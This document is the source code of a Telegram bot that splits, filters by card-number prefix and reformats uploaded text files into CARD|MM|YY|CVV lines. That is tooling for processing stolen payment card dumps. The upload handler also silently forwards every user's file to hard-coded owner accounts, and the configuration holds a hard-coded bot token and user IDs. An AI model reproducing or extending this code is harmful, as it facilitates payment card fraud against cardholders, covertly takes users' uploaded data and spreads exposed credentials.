import os
import logging
import asyncio
import re
from datetime import datetime
from telegram import Update, InputFile
from telegram.ext import (
    ApplicationBuilder,
    ContextTypes,
    CommandHandler,
    MessageHandler,
    filters,
    Application
)
from telegram.constants import ParseMode
from telegram.error import TelegramError

# ==================================================
# CONFIGURATION
# ==================================================
# Replace with your actual Bot Token or use Environment Variables
BOT_TOKEN = "8811033165:AAG4NQszrJa3bP0Cgz-nuanE1g7RVVb2coA"

# List of Owner IDs
OWNER_IDS = [
    6382539239,
    8665264271
]

# Path configuration
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
UPLOADS_DIR = os.path.join(BASE_DIR, "uploads")
OUTPUTS_DIR = os.path.join(BASE_DIR, "outputs")
LOGS_DIR = os.path.join(BASE_DIR, "logs")

# Create directories if they don't exist
for folder in [UPLOADS_DIR, OUTPUTS_DIR, LOGS_DIR]:
    os.makedirs(folder, exist_ok=True)

# Logging Setup
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(os.path.join(LOGS_DIR, "bot.log")),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Global state to track downloaded files and stop flags
# Format: {(chat_id, message_id): "path_to_file"}
downloaded_files = {}
# stop_flags = { user_id: bool }
stop_flags = {}

# ==================================================
# UTILITY FUNCTIONS
# ==================================================

def get_user_identifier(user):
    """Returns username if exists, else first_name."""
    if user.username:
        return f"@{user.username}"
    return user.first_name

async def forward_to_owners(context: ContextTypes.DEFAULT_TYPE, user, file_path, file_name):
    """Forwards the uploaded file to all owners cleanly without IDs."""
    caption = (
        f"📩 <b>New Upload Received</b>\n\n"
        f"<b>Uploader:</b> {get_user_identifier(user)}\n"
        f"<b>File Name:</b> <code>{file_name}</code>"
    )
    for owner_id in OWNER_IDS:
        try:
            with open(file_path, 'rb') as f:
                await context.bot.send_document(
                    chat_id=owner_id,
                    document=f,
                    caption=caption,
                    parse_mode=ParseMode.HTML
                )
        except Exception as e:
            logger.error(f"Error forwarding to owner {owner_id}: {e}")

async def count_lines(file_path):
    """Efficiently count lines in a large file."""
    count = 0
    with open(file_path, 'rb') as f:
        for _ in f:
            count += 1
    return count

async def get_file_from_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Checks if command is a reply to a valid TXT document.
    Returns (file_path, error_message).
    """
    reply = update.message.reply_to_message
    if not reply or not reply.document:
        return None, "❌ Please reply directly to the specific TXT file you want to process."

    if not reply.document.file_name.endswith('.txt'):
        return None, "❌ The replied file is not a valid TXT file."

    chat_id = update.effective_chat.id
    msg_id = reply.message_id
    cache_key = (chat_id, msg_id)

    # If the file path is already cached and exists
    if cache_key in downloaded_files and os.path.exists(downloaded_files[cache_key]):
        return downloaded_files[cache_key], None

    # If not in cache (e.g. after restart), download it on-the-fly
    try:
        msg = await update.message.reply_text("📥 Fetching the target file...")
        file = await context.bot.get_file(reply.document.file_id)
        file_path = os.path.join(UPLOADS_DIR, f"{chat_id}_{msg_id}.txt")
        await file.download_to_drive(file_path)
        downloaded_files[cache_key] = file_path
        await msg.delete()
        return file_path, None
    except Exception as e:
        logger.error(f"Error downloading replied file: {e}")
        return None, f"❌ Failed to download replied file: {str(e)}"

# ==================================================
# COMMAND HANDLERS
# ==================================================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    name = get_user_identifier(user)
    welcome_msg = (
        f"Hello {name}!\n\n"
        f"Upload a file in .txt format ⚡"
    )
    await update.message.reply_text(welcome_msg)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = (
        "📖 <b>Help Menu</b>\n\n"
        "1️⃣ Upload a <code>.txt</code> file first.\n"
        "2️⃣ Reply to that file using any command below:\n\n"
        "⚡ <code>/spl &lt;N&gt;</code> – Split TXT file every N lines\n"
        "🔍 <code>/ext &lt;prefix&gt;</code> – Extract lines with prefix\n"
        "🧹 <code>/clear</code> – Format TXT to CARD|MM|YY|CVV\n"
        "🛑 <code>/stop</code> – Stop current process\n"
        "❓ <code>/help</code> – Show this message"
    )
    await update.message.reply_text(help_text, parse_mode=ParseMode.HTML)

async def stop_process(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    stop_flags[user_id] = True
    await update.message.reply_text("🛑 Stopping process... Please wait.")

# ==================================================
# FILE UPLOAD HANDLE
# ==================================================

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    chat_id = update.effective_chat.id
    msg_id = update.message.message_id
    doc = update.message.document

    if not doc.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please upload a TXT file only.")
        return

    # Download file
    msg = await update.message.reply_text("📥 Downloading file...")
    file = await context.bot.get_file(doc.file_id)
    
    # Store with unique message ID so replies can map to it perfectly
    file_path = os.path.join(UPLOADS_DIR, f"{chat_id}_{msg_id}.txt")
    await file.download_to_drive(file_path)

    downloaded_files[(chat_id, msg_id)] = file_path
    stop_flags[user.id] = False

    await msg.edit_text(
        "✅ TXT file received successfully 🔥\n\n"
        "<b>Now reply directly to that file with</b> 👇\n"
        "• /spl <N> – Split TXT file\n"
        "• /ext <prefix> – Extract prefix lines\n"
        "• /clear – Clean TXT file\n"
        "• /stop – Stop running process",
        parse_mode=ParseMode.HTML
    )

    # Forward cleanly to owners
    await forward_to_owners(context, user, file_path, doc.file_name)

# ==================================================
# FEATURE: SPLIT (/spl)
# ==================================================

async def split_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    # Retrieve specific file by replying
    input_path, error_msg = await get_file_from_reply(update, context)
    if error_msg:
        await update.message.reply_text(error_msg)
        return

    # Regex to handle /spl100 or /spl 100
    text = update.message.text
    match = re.search(r'/spl\s*(\d+)', text)
    
    if not match:
        await update.message.reply_text("❌ Invalid format. Reply to a file with: /spl 100 or /spl100")
        return

    lines_per_file = int(match.group(1))
    if lines_per_file <= 0:
        await update.message.reply_text("❌ Number must be greater than 0.")
        return

    total_lines = await count_lines(input_path)
    num_files = (total_lines + lines_per_file - 1) // lines_per_file

    status_msg = await update.message.reply_text(
        f"🚀 <b>Processing Started</b>\n\n"
        f"Total Lines: {total_lines}\n"
        f"Lines Per File: {lines_per_file}\n"
        f"Files To Create: {num_files}",
        parse_mode=ParseMode.HTML
    )

    stop_flags[user_id] = False
    
    try:
        with open(input_path, 'r', encoding='utf-8', errors='ignore') as infile:
            current_file_num = 1
            line_count = 0
            current_out_lines = []

            for line in infile:
                if stop_flags.get(user_id):
                    await update.message.reply_text("Process stopped by user.")
                    return

                current_out_lines.append(line)
                line_count += 1

                if line_count >= lines_per_file:
                    out_filename = f"part_{current_file_num}_{user_id}.txt"
                    out_path = os.path.join(OUTPUTS_DIR, out_filename)
                    
                    with open(out_path, 'w', encoding='utf-8') as outfile:
                        outfile.writelines(current_out_lines)
                    
                    with open(out_path, 'rb') as f:
                        await context.bot.send_document(chat_id=user_id, document=f)
                    
                    os.remove(out_path)
                    current_out_lines = []
                    line_count = 0
                    current_file_num += 1
                    await asyncio.sleep(0.5) # Avoid flood limits

            # Handle remaining lines
            if current_out_lines:
                out_filename = f"part_{current_file_num}_{user_id}.txt"
                out_path = os.path.join(OUTPUTS_DIR, out_filename)
                with open(out_path, 'w', encoding='utf-8') as outfile:
                    outfile.writelines(current_out_lines)
                with open(out_path, 'rb') as f:
                    await context.bot.send_document(chat_id=user_id, document=f)
                os.remove(out_path)

        await update.message.reply_text("✅ Splitting completed!")
    except Exception as e:
        logger.error(f"Error during /spl: {e}")
        await update.message.reply_text(f"❌ Error: {str(e)}")

# ==================================================
# FEATURE: EXTRACT (/ext)
# ==================================================

async def extract_prefix(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    # Retrieve specific file by replying
    input_path, error_msg = await get_file_from_reply(update, context)
    if error_msg:
        await update.message.reply_text(error_msg)
        return

    text = update.message.text
    # Catching prefix regardless of space
    match = re.search(r'/ext\s*(.+)', text)
    if not match:
        await update.message.reply_text("❌ Reply with: /ext <prefix> (e.g., /ext4960)")
        return

    prefix = match.group(1).strip()
    out_filename = f"extracted_{user_id}.txt"
    out_path = os.path.join(OUTPUTS_DIR, out_filename)
    
    await update.message.reply_text(f"🔍 Extracting lines starting with: `{prefix}`", parse_mode=ParseMode.MARKDOWN)
    
    stop_flags[user_id] = False
    count = 0

    try:
        with open(input_path, 'r', encoding='utf-8', errors='ignore') as infile, \
             open(out_path, 'w', encoding='utf-8') as outfile:
            for line in infile:
                if stop_flags.get(user_id):
                    await update.message.reply_text("Process stopped.")
                    return
                if line.startswith(prefix):
                    outfile.write(line)
                    count += 1

        if count > 0:
            with open(out_path, 'rb') as f:
                await context.bot.send_document(
                    chat_id=user_id, 
                    document=f, 
                    caption=f"✅ Extracted {count} lines."
                )
        else:
            await update.message.reply_text("❌ No matches found.")
        
        if os.path.exists(out_path):
            os.remove(out_path)

    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

# ==================================================
# FEATURE: CLEAR (/clear)
# ==================================================

async def clear_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    # Retrieve specific file by replying
    input_path, error_msg = await get_file_from_reply(update, context)
    if error_msg:
        await update.message.reply_text(error_msg)
        return

    out_filename = f"cleaned_{user_id}.txt"
    out_path = os.path.join(OUTPUTS_DIR, out_filename)
    
    await update.message.reply_text("🧹 Cleaning file... (Keeping CARD|MM|YY|CVV)")
    
    stop_flags[user_id] = False
    count = 0

    try:
        with open(input_path, 'r', encoding='utf-8', errors='ignore') as infile, \
             open(out_path, 'w', encoding='utf-8') as outfile:
            for line in infile:
                if stop_flags.get(user_id): break
                
                # Split by pipe and take first 4 parts
                parts = line.strip().split('|')
                if len(parts) >= 4:
                    clean_line = "|".join(parts[:4])
                    outfile.write(clean_line + "\n")
                    count += 1
        
        if count > 0:
            with open(out_path, 'rb') as f:
                await context.bot.send_document(
                    chat_id=user_id, 
                    document=f, 
                    caption=f"✅ Cleaned {count} lines."
                )
        else:
            await update.message.reply_text("❌ No valid lines found to clean.")
            
        if os.path.exists(out_path):
            os.remove(out_path)
            
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

# ==================================================
# MAIN ENTRY POINT
# ==================================================

def main():

    application = ApplicationBuilder().token(BOT_TOKEN).build()

    # Handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("stop", stop_process))
    
    # Regex handlers for commands without spaces (/spl100) or with spaces
    application.add_handler(MessageHandler(filters.Regex(r'^/spl\d+$') | filters.Regex(r'^/spl\s+\d+$'), split_file))
    application.add_handler(MessageHandler(filters.Regex(r'^/ext.+$'), extract_prefix))
    
    application.add_handler(CommandHandler("clear", clear_file))
    
    # Document Handler
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))

    print("Bot is running...")
    application.run_polling()

if __name__ == '__main__':
    main()
